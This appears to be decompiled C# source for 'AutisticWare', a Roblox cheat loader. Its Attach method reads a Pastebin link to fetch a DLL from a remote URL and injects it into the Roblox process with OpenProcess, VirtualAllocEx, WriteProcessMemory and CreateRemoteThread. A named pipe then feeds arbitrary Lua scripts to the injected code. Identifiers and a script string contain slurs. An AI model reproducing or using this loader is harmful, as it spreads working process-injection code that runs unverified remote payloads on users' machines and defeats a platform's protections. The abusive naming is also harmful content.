using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace AutisticWareThemeAPI
{
    // Token: 0x02000002 RID: 2
    public class AutisticThemeAPI
    {
        // Token: 0x06000001 RID: 1
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool WaitNamedPipe(string name, int timeout);

        // Token: 0x06000002 RID: 2 RVA: 0x00002050 File Offset: 0x00000250
        public static bool NamedPipeExist(string pipeName)
        {
            bool result;
            try
            {
                int timeout = 0;
                if (!AutisticThemeAPI.WaitNamedPipe(Path.GetFullPath(string.Format("\\\\\\\\.\\\\pipe\\\\{0}", pipeName)), timeout))
                {
                    int lastWin32Error = Marshal.GetLastWin32Error();
                    if (lastWin32Error == 0)
                    {
                        result = false;
                        return result;
                    }
                    if (lastWin32Error == 2)
                    {
                        result = false;
                        return result;
                    }
                }
                result = true;
            }
            catch (Exception)
            {
                result = false;
            }
            return result;
        }

        // Token: 0x06000003 RID: 3 RVA: 0x000020AC File Offset: 0x000002AC
        public static void LuaPipe(string script)
        {
            if (AutisticThemeAPI.NamedPipeExist(AutisticThemeAPI.luapipename))
            {
                new Thread(delegate ()
                {
                    try
                    {
                        using (NamedPipeClientStream namedPipeClientStream = new NamedPipeClientStream(".", AutisticThemeAPI.luapipename, PipeDirection.Out))
                        {
                            namedPipeClientStream.Connect();
                            using (StreamWriter streamWriter = new StreamWriter(namedPipeClientStream, Encoding.Default, 999999))
                            {
                                streamWriter.Write(script);
                                streamWriter.Dispose();
                            }
                            namedPipeClientStream.Dispose();
                        }
                    }
                    catch (IOException)
                    {
                    }
                    catch (Exception)
                    {
                    }
                }).Start();
                return;
            }
        }

        // Token: 0x06000004 RID: 4 RVA: 0x000020EC File Offset: 0x000002EC
        public void Attach()
        {
            foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
            {
                if (File.Exists("AutisticWare.dll"))
                {
                    File.Delete("AutisticWare.dll");
                }
                this.wc.DownloadFile(this.wc.DownloadString("https://pastebin.com/raw/X8TSttG0"), "AutisticWare.dll");
                AutisticThemeAPI.Injector.DllInjector.GetInstance.Inject("RobloxPlayerBeta", AppDomain.CurrentDomain.BaseDirectory + "AutisticWare.dll");
            }
        }

        // Token: 0x06000005 RID: 5 RVA: 0x00002170 File Offset: 0x00000370
        public void KillRoblox()
        {
            foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
            {
                try
                {
                    process.Kill();
                }
                catch (Exception)
                {
                }
            }
        }

        // Token: 0x06000006 RID: 6 RVA: 0x000021B8 File Offset: 0x000003B8
        public void Execute(string Script)
        {
            AutisticThemeAPI.LuaPipe(Script);
        }

        // Token: 0x06000007 RID: 7 RVA: 0x000021C0 File Offset: 0x000003C0
        public void ImGUI()
        {
            foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
            {
                this.Execute("darwinisafag()");
                this.Execute("game.StarterGui:SetCore('SendNotification', {Duration = 10; Title='AutisticWare - Generic Exploit Loader mode.'; Text='To use the IMGUI Press delete on keyboard!'})");
            }
        }

        // Token: 0x04000001 RID: 1
        public static string luapipename = "ThisIsSoSadAlexaPlayDespacito";

        // Token: 0x04000002 RID: 2
        private readonly WebClient wc = new WebClient();

        // Token: 0x02000003 RID: 3
        private class Injector
        {
            // Token: 0x02000005 RID: 5
            public enum DllInjectionResult
            {
                // Token: 0x04000006 RID: 6
                DllNotFound,
                // Token: 0x04000007 RID: 7
                GameProcessNotFound,
                // Token: 0x04000008 RID: 8
                InjectionFailed,
                // Token: 0x04000009 RID: 9
                Success
            }

            // Token: 0x02000006 RID: 6
            public sealed class DllInjector
            {
                // Token: 0x0600000D RID: 13
                [DllImport("kernel32.dll", SetLastError = true)]
                private static extern IntPtr OpenProcess(uint dwDesiredAccess, int bInheritHandle, uint dwProcessId);

                // Token: 0x0600000E RID: 14
                [DllImport("kernel32.dll", SetLastError = true)]
                private static extern int CloseHandle(IntPtr hObject);

                // Token: 0x0600000F RID: 15
                [DllImport("kernel32.dll", SetLastError = true)]
                private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

                // Token: 0x06000010 RID: 16
                [DllImport("kernel32.dll", SetLastError = true)]
                private static extern IntPtr GetModuleHandle(string lpModuleName);

                // Token: 0x06000011 RID: 17
                [DllImport("kernel32.dll", SetLastError = true)]
                private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);

                // Token: 0x06000012 RID: 18
                [DllImport("kernel32.dll", SetLastError = true)]
                private static extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, int lpNumberOfBytesWritten);

                // Token: 0x06000013 RID: 19
                [DllImport("kernel32.dll", SetLastError = true)]
                private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttribute, IntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

                // Token: 0x17000001 RID: 1
                // (get) Token: 0x06000014 RID: 20 RVA: 0x000022E0 File Offset: 0x000004E0
                public static AutisticThemeAPI.Injector.DllInjector GetInstance
                {
                    get
                    {
                        if (AutisticThemeAPI.Injector.DllInjector._instance == null)
                        {
                            AutisticThemeAPI.Injector.DllInjector._instance = new AutisticThemeAPI.Injector.DllInjector();
                        }
                        return AutisticThemeAPI.Injector.DllInjector._instance;
                    }
                }

                // Token: 0x06000015 RID: 21 RVA: 0x000022F8 File Offset: 0x000004F8
                private DllInjector()
                {
                }

                // Token: 0x06000016 RID: 22 RVA: 0x00002300 File Offset: 0x00000500
                public AutisticThemeAPI.Injector.DllInjectionResult Inject(string sProcName, string sDllPath)
                {
                    if (!File.Exists(sDllPath))
                    {
                        return AutisticThemeAPI.Injector.DllInjectionResult.DllNotFound;
                    }
                    uint num = 0u;
                    Process[] processes = Process.GetProcesses();
                    for (int i = 0; i < processes.Length; i++)
                    {
                        if (processes[i].ProcessName == sProcName)
                        {
                            num = (uint)processes[i].Id;
                            break;
                        }
                    }
                    if (num == 0u)
                    {
                        return AutisticThemeAPI.Injector.DllInjectionResult.GameProcessNotFound;
                    }
                    if (!this.bInject(num, sDllPath))
                    {
                        return AutisticThemeAPI.Injector.DllInjectionResult.InjectionFailed;
                    }
                    return AutisticThemeAPI.Injector.DllInjectionResult.Success;
                }

                // Token: 0x06000017 RID: 23 RVA: 0x0000235C File Offset: 0x0000055C
                private bool bInject(uint pToBeInjected, string sDllPath)
                {
                    IntPtr intPtr = AutisticThemeAPI.Injector.DllInjector.OpenProcess(1082u, 1, pToBeInjected);
                    if (intPtr == AutisticThemeAPI.Injector.DllInjector.INTPTR_ZERO)
                    {
                        return false;
                    }
                    IntPtr procAddress = AutisticThemeAPI.Injector.DllInjector.GetProcAddress(AutisticThemeAPI.Injector.DllInjector.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                    if (procAddress == AutisticThemeAPI.Injector.DllInjector.INTPTR_ZERO)
                    {
                        return false;
                    }
                    IntPtr intPtr2 = AutisticThemeAPI.Injector.DllInjector.VirtualAllocEx(intPtr, (IntPtr)null, (IntPtr)sDllPath.Length, 12288u, 64u);
                    if (intPtr2 == AutisticThemeAPI.Injector.DllInjector.INTPTR_ZERO)
                    {
                        return false;
                    }
                    byte[] bytes = Encoding.ASCII.GetBytes(sDllPath);
                    if (AutisticThemeAPI.Injector.DllInjector.WriteProcessMemory(intPtr, intPtr2, bytes, (uint)bytes.Length, 0) == 0)
                    {
                        return false;
                    }
                    if (AutisticThemeAPI.Injector.DllInjector.CreateRemoteThread(intPtr, (IntPtr)null, AutisticThemeAPI.Injector.DllInjector.INTPTR_ZERO, procAddress, intPtr2, 0u, (IntPtr)null) == AutisticThemeAPI.Injector.DllInjector.INTPTR_ZERO)
                    {
                        return false;
                    }
                    AutisticThemeAPI.Injector.DllInjector.CloseHandle(intPtr);
                    return true;
                }

                // Token: 0x0400000A RID: 10
                private static readonly IntPtr INTPTR_ZERO = (IntPtr)0;

                // Token: 0x0400000B RID: 11
                private static AutisticThemeAPI.Injector.DllInjector _instance;
            }
        }
    }
}
